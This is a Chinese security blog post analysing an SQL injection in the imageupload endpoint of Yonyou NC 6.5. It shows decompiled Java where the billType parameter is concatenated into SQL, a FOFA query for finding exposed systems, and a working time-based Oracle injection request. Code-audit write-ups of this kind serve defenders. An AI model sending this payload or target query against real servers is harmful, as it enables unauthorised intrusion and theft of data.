---
title: "用友NC系统影像管理-影像上传 imageupload SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-billadd_ctr-imageupload-billType-sqli.html
asset_dir: assets/用友nc系统影像管理-影像上传-imageupload-sql注入漏洞
---

# 用友NC系统影像管理-影像上传 imageupload SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/11 08:16
- 1028浏览
- [0评论](#comment)
- 45分钟阅读

深入探索

sql

SQL

服务器

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统imageupload接口存在sql注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，从而窃取服务器的敏感信息。

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告可知 imageUpload 为sql注入点

[![用友NC系统影像管理-影像上传 imageupload SQL注入漏洞](images/img-001-c96a2592f6a9.webp)](https://image.mrxn.net/e1bdeaeaa81f47b085993785099bfcf0.webp)

因此搜索 imageUpload 方法定义即可找到业务逻辑实现代码

深入探索

传输层安全性协议

文件大小转换

计算机安全

```
package nc.web.arap.controller;

import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.arap.util.ArapBillVOUtils;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.common.NCLocator;
import nc.itf.arap.web.IWebPubService;
import nc.itf.image.IImageScanQueryService;
import nc.jdbc.framework.generator.IdGenerator;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.vo.arap.AbstractBillDefValue;
import nc.vo.arap.basebill.BaseAggVO;
import nc.vo.jcom.lang.StringUtil;
import nc.vo.pub.AggregatedValueObject;
import nc.vo.pub.BusinessException;
import nc.vo.pub.bill.BillTempletVO;
import nc.vo.pub.billtype.BilltypeVO;
import nc.web.arap.bill.pub.ArapWebBillRefcfg;
import nc.web.arap.bill.pub.WebBillTypeFactory;
import nc.web.arap.environment.EnvironmentInit;
import nc.web.arap.factory.NCLocatorFactory;
import nc.web.arap.json.TranslateValueObjectToJson;
import nc.web.arap.utils.ArapTemplateInterpereter;
import nc.web.arap.utils.ArapTemplateQueryUtil;
import nc.web.datatrans.itf.ITranslateDataService;
import org.apache.commons.lang.StringUtils;
import org.codehaus.jettison.json.JSONException;
import org.codehaus.jettison.json.JSONObject;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import uap.iweb.plugin.model.BrotherPair;
import uap.web.util.JsonUtil;

@Controller
@RequestMapping({"/billadd_ctr"})
public class BillAddController extends ArapController {
    public BillAddController() {
    }

@RequestMapping(
    value = {"/imageupload"},
    method = {RequestMethod.GET}
)
public String imageUpload(HttpServletRequest request, HttpServletResponse response) throws BusinessException {
    Enumeration enums = request.getParameterNames();

    while(enums.hasMoreElements()) {
        String key = enums.nextElement().toString();
        request.setAttribute(key, request.getParameter(key));
    }

    String pk_tradetypecode = request.getParameter("billType");
    String pk_org = request.getParameter("pk_org");
    int scanType = 1;
    if (StringUtils.isNotEmpty(pk_tradetypecode) && StringUtils.isEmpty(pk_org)) {
        IImageScanQueryService service = (IImageScanQueryService)NCLocatorFactory.getInstance().getFiwebNCLocator().lookup(IImageScanQueryService.class);
        scanType = service.queryImageScan(pk_org, pk_tradetypecode);
    }

    request.setAttribute("scanType", scanType);
    return "imageupload";
}
}
```

billType ==> pk\_tradetypecode ==> 进入 service.queryImageScan,其实现逻辑如下

```
public interface IImageScanQueryService {
    int queryImageScan(String var1, String var2) throws BusinessException;
}

public int queryImageScan(String pk_org, String billortrantypecode) throws BusinessException {
    Map<String, BilltypeVO> allBillType = PfDataCache.getBilltypes();

    for(Map.Entry<String, BilltypeVO> entry : allBillType.entrySet()) {
        BilltypeVO billTypeVO = (BilltypeVO)entry.getValue();
        if (billTypeVO.getPk_billtypecode().equals(billortrantypecode)) {
            this.billtype = billTypeVO.getParentbilltype();
            break;
        }
    }

    BaseDAO dao = new BaseDAO();
    List<ImageScanSetupVO> list = (List)dao.retrieveByClause(ImageScanSetupVO.class, this.getCondition(pk_org, billortrantypecode));
    if (list.size() != 0) {

private String getCondition(String pk_org, String billortrantypecode) {
    String condition = "pk_org='" + pk_org + "'" + " and (" + "billortrantypecode" + "='" + billortrantypecode + "'" + " or " + "billtypecode" + "='" + this.billtype + "'" + ") ";
    return condition;
}
```

带入 dao.retrieveByClause ,有关 dao.retrieveByClause 的实现逻辑处理参考前一篇文章：[用友NC setting/renew sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-setting-renew-pageName-pageModule-sqli.html "用友NC setting/renew sql注入漏洞")

- 遍历请求参数并将其设置到request属性中。
- 获取两个参数：billType和pk\_org
- 初始化scanType为1
- 如果billType不为空且pk\_org为空，则调用服务查询scanType

最终 billType 拼接进 getCondition 函数的SQL语句中，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

注意漏洞利用只能是 GET 方法

```
GET /portal/pt/billadd_ctr/imageupload?billType=-1')and 1=dbms_pipe.receive_message('RDS',4)--&pageId=login&pk_org= HTTP/1.0
Host: nc65.mrxn.net
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=671`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
